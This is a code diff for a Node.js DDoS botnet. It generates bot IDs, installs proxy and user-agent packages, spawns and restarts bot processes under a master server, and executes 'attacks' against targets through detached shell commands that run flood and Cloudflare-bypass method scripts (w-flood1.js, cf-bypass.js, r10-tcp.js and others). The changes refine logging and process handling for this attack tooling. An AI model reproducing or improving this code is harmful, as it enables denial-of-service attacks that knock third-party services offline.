@@ -36,10 +36,8 @@ function color(text, colorCode) {
 
 // ========== GENERATE UNIQUE BOT ID ==========
 function generateBotId() {
-  const hostname = os.hostname();
   const timestamp = Date.now().toString(36);
   const random = crypto.randomBytes(6).toString('hex');
-  const pid = process.pid;
   return `bot-${random}-${timestamp.slice(-4)}`;
 }
 
@@ -113,9 +111,9 @@ function log(message, type = 'info') {
   }
 }
 
-// ========== INSTALL PACKAGES ==========
-async function installNpmPackages() {
-  const requiredPackages = ['axios', 'socks', 'random-useragent', 'https-proxy-agent', 'socks-proxy-agent', 'set-cookie-parser', 'hpack'];
+// ========== CHECK PACKAGES ==========
+function checkPackages() {
+  const requiredPackages = ['axios', 'socks', 'random-useragent', 'https-proxy-agent', 'socks-proxy-agent', 'set-cookie-parser'];
   const missing = [];
   for (const pkg of requiredPackages) {
     try { 
@@ -124,19 +122,45 @@ async function installNpmPackages() {
       missing.push(pkg); 
     }
   }
-  if (missing.length > 0) {
-    return new Promise((resolve, reject) => {
-      const install = spawn('npm', ['install', ...missing, '--no-save', '--silent'], { 
-        stdio: 'pipe', 
-        shell: true 
-      });
-      install.on('close', (code) => { 
-        code === 0 ? resolve() : reject(new Error('Install failed')); 
-      });
-      install.on('error', (err) => reject(err));
-    });
+  return missing;
+}
+
+// ========== INSTALL PACKAGES ==========
+async function installNpmPackages() {
+  const missing = checkPackages();
+  if (missing.length === 0) {
+    return Promise.resolve();
   }
-  return Promise.resolve();
+  
+  log(\`Installing missing packages: \${missing.join(', ')}\`, 'info');
+  
+  return new Promise((resolve, reject) => {
+    const install = spawn('npm', ['install', ...missing, '--no-save', '--silent'], { 
+      stdio: 'pipe', 
+      shell: true,
+      cwd: __dirname
+    });
+    
+    let stderr = '';
+    install.stderr.on('data', (data) => {
+      stderr += data.toString();
+    });
+    
+    install.on('close', (code) => { 
+      if (code === 0) {
+        log('Packages installed successfully', 'success');
+        resolve();
+      } else {
+        log(\`Install failed: \${stderr || 'Unknown error'}\`, 'error');
+        reject(new Error('Install failed'));
+      }
+    });
+    
+    install.on('error', (err) => {
+      log(\`Install error: \${err.message}\`, 'error');
+      reject(err);
+    });
+  });
 }
 
 // ========== FILE MANAGEMENT ==========
@@ -276,7 +300,8 @@ function executeAttack(target, time, methods) {
     const proc = exec(cmd, { 
       detached: true, 
       maxBuffer: 1024 * 1024,
-      shell: true
+      shell: true,
+      cwd: __dirname
     }, (error, stdout, stderr) => {
       if (error && error.code !== 'SIGTERM') return;
       if (stdout) {
@@ -399,7 +424,14 @@ function shutdown() {
 async function startBot() {
   log(\`Starting bot: \${BOT_NAME}\`, 'info');
   
-  await installNpmPackages();
+  // Check and install packages in the main directory
+  try {
+    await installNpmPackages();
+  } catch (error) {
+    log(\`Package installation failed: \${error.message}\`, 'error');
+    // Continue anyway - some packages might already be available
+  }
+  
   const { proxyPath, uaPath } = ensureFiles();
   loadProxies(proxyPath);
   loadUserAgents(uaPath);
@@ -425,7 +457,6 @@ startBot().catch(error => {
 class MultiBotController {
   constructor() {
     this.bots = [];
-    this.botScripts = [];
     this.botProcesses = [];
     this.isRunning = true;
     this.mainDir = __dirname;
@@ -466,7 +497,8 @@ class MultiBotController {
         ...process.env,
         BOT_ID: bot.id,
         BOT_NAME: bot.name,
-        MASTER_SERVER: MASTER_SERVER
+        MASTER_SERVER: MASTER_SERVER,
+        NODE_PATH: path.join(this.mainDir, 'node_modules')
       }
     });
     
@@ -501,7 +533,7 @@ class MultiBotController {
       
       if (this.isRunning) {
         console.log(color(`[${bot.id.slice(0,8)}] Restarting...`, colors.cyan));
-        setTimeout(() => this.spawnBot(index), 2000);
+        setTimeout(() => this.spawnBot(index), 3000);
       }
     });
     
@@ -601,8 +633,7 @@ function createMethodStubs() {
   const methodsDir = 'methods';
   const methodFiles = [
     'high-dstat.js', 'w-flood1.js', 'vhold.js', 'nust.js', 'BYPASS.js', 'cibi.js', 
-    'REX-COSTUM.js', 'h2-nust', 'http-panel.js', 'uam.js', 'wil.js', 'cf-bypass.js', 
-    'modern-flood.js', 'raw-get.js',
+    'REX-COSTUM.js', 'cf-bypass.js', 'modern-flood.js', 'raw-get.js',
     'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js', 
     'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
   ];
